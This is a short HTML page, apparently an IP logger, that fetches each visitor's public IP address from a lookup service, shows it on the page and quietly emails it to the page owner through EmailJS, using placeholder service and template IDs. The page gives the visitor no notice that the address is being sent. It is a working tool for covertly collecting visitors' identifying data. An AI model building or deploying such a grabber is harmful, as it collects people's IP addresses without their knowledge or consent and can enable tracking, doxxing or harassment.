<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send IP to Email</title>
    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
        (function() {
            // Initialize EmailJS with your user ID (replace 'your-user-id' with yours)
            emailjs.init('your-user-id');
        })();
    </script>
</head>
<body>
    <h1>Your IP Address:</h1>
    <p id="ip">Fetching your IP...</p>

    <script>
        // Fetch the IP address
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const ip = data.ip;
                document.getElementById('ip').textContent = ip;

                // Send the IP to your email
                emailjs.send('your-service-id', 'your-template-id', { user_ip: ip, from_name: "lmao", to_name: "recipient" })
                    .then(() => {
                        console.log('IP sent to email!');
                    })
                    .catch(error => {
                        console.error('Failed to send email:', error);
                    });
            })
            .catch(error => {
                console.error('Error fetching IP:', error);
                document.getElementById('ip').textContent = 'Could not fetch your IP address.';
            });
    </script>
</body>
</html>
